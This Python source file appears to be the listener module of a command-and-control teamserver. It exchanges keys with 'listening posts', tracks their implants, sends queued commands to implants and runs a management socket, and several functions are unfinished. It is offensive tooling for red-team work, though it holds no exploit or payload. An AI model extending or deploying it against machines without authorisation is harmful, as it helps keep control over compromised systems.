import asyncio
from threading import Thread

from lib import networking
from lib import instructions
from lib.crypto import asymmetric


# TODO: All frame cooking and uncooking should be done here for


def lp_init(frame, teamserver):
    """
    RECEIVES: Initialization from listening post, pubkey used by listening_post for next transaction
    SENDS: Teamserver pubkey used for next transaction
    SETS: Pubkey for lp component, state for lp component, Keypair for teamserver comms for lp component

    :param frame:
    :param teamserver:
    :return:
    """
    # We'll get a txid here from the frame
    data = {'component_id': frame['component_id'], "cmd": "lpo",
            "args": [{"tpk": teamserver.initial_public_key._public_key}],
            "txid": frame['txid']}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = instruction_frame
    return reply_frame


def lp_initialized(frame, teamserver):
    """
    RECEIVES: Manifest from listening post, pubkey used by listening_post for next transaction
    SENDS: Teamserver pubkey used for next transaction, ACK of received manifest
    SETS: Pubkey for lp component, state for lp component, Keypair for teamserver comms for lp component, manifest of
      lp component. Manifest for implant(s) in lp component's sent manifest

    :param frame:
    :param teamserver:
    :return:
    """
    data = {'component_id': frame['component_id'], "cmd": "lpmo",
            "args": [{"tpk": teamserver.initial_public_key._public_key}],
            "txid": frame['txid']}
    # TODO: Value setting, cooking
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = instruction_frame
    teamserver.logging.log(f"Got new listening post! ID: {reply_frame['component_id']}", source="lib.listener")
    return reply_frame


def lp_process_manifest(frame, teamserver):
    # TODO: Extract and process the manifest
    # TODO: Implement me
    listening_post_manifest = next(item for item in frame['args'] if item["component_id"] == frame['component_id'])
    listening_post_manifest['lpk'] = asymmetric.public_key_from_bytes(str(frame['args'][1]['lpk']))
    # TODO: Check if implants are already in manifest
    # TODO: Check if lp even has implants, handle that case
    for implant in listening_post_manifest['implants']:
        teamserver.implants.append(implant)
    # TODO: Check if listener is already in manifest
    teamserver.listeners.append(listening_post_manifest)
    reply_frame = lp_initialized(frame, teamserver)  # debug
    return reply_frame


def lp_rekey(frame, teamserver):
    """
    RECEIVES: Rekey request from listening post, pubkey used by listening_post for next transaction
    SENDS: Teamserver pubkey used for next transaction, ACK of rekey request
    SETS: Pubkey for lp component, keypair for teamserver comms for lp component

    :param frame:
    :param teamserver:
    :return:
    """
    # TODO: implement me
    reply_frame = lp_initialized(frame, teamserver)
    return reply_frame


def lp_getcmd(frame, teamserver):
    """
    RECEIVES: Command request from listening post, pubkey used by listening post for next transaction
    SENDS: Teamserver pubkey used for next transaction, command from listening post cmd queue
    SETS: Pubkey for lp component, keypair for teamserver comms for lp component

    :param frame:
    :param teamserver:
    :return:
    """
    lp_implants = []
    lp_implants.append(next(item for item in teamserver.implants if item["lp_id"] == frame['component_id']))
    reply_commands = []
    for implant in lp_implants:
        # TODO: Update command state, or move it into a finished queue
        try:
            reply_commands.append(
                next(item for item in teamserver.cmd_queue if item["component_id"] == implant['implant_id'])
            )
            for command in reply_commands:
                cmd_index = next(
                    (index for (index, d) in enumerate(teamserver.cmd_queue) if d["txid"] == command["txid"]),
                    None)
                teamserver.cmd_queue[cmd_index]['state'] = "SENT"
                teamserver.cmd_sent.append(teamserver.cmd_queue[cmd_index])
                teamserver.cmd_queue.pop(cmd_index)
        except StopIteration:
            pass
    if len(reply_commands) is not 0:
        data = {'component_id': frame['component_id'], "cmd": "rcmd",
                "args": [reply_commands, {"tpk": teamserver.initial_public_key._public_key}], "txid": frame['txid']}
    else:
        data = {'component_id': frame['component_id'], "cmd": "noop",
                "args": [{"tpk": teamserver.initial_public_key._public_key}], "txid": frame['txid']}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = instruction_frame
    return reply_frame


def find_lp_pubkey(search_key, teamserver):
    """
    Returns the listener manifest that matches for the given pubkey

    :param search_key:
    :param teamserver:
    :return:
    """
    # TODO:
    next(item for item in teamserver.listeners if item["lpk"] == search_key)


def start_background_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()


def start_management_socket(teamserver):
    teamserver = teamserver
    loop = asyncio.new_event_loop()
    t = Thread(target=start_background_loop, args=(loop,), daemon=False)
    loop.create_task(asyncio.start_server(lambda reader, writer: networking.handle_client(reader=reader, writer=writer,
                                                                                          teamserver=teamserver),
                                          host=teamserver.config['l_addr'],
                                          port=int(teamserver.config['l_port']), ))
    t.start()
    return t
